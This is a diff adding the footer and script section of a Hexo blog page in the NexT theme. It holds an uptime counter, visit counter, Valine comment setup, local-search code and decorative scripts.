+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "已存在 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+ setInterval("createtime()",250);
+ </script>
+
+<!--
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+-->
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </div></footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '9Pgz8ir0b40IXQ5V3bjRc8m0-gzGzoHsz',
+        appKey: 'VCCuCSQHpPqX3hmOh0PlmfXu',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+ <!-- ҳ����С���� -->
+ <script type="text/javascript" src="/js/src/love.js"></script>
+
+  
+  
+  <!--������ƭ-->
+ <script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://myqinshimoon.github.io/background.jpg");
+  </script>
+
+
+</body>
+</html>
